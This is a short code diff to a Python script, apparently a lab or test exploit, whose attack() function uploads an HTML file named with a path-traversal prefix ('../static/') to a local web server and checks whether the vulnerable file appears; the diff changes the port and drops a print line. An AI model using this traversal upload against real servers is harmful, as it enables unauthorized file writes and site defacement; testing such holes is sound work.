@@ -8,7 +8,7 @@ import os
 import random
 import time
 
-URL = 'http://127.0.0.1:5000/'
+URL = 'http://127.0.0.1:47525/'
 
 def attack():
 	filename = str(random.randint(1, 1000)) + '.html'
@@ -17,7 +17,6 @@ def attack():
 
 	files = {'file': ('../static/'+filename, open(file_location,'r'), 'text/html')}
 
-	print(filename)
 	r_post = requests.post(URL, files=files)
 	if r_post.status_code == 200:
 		# check if the vulnerable file exist
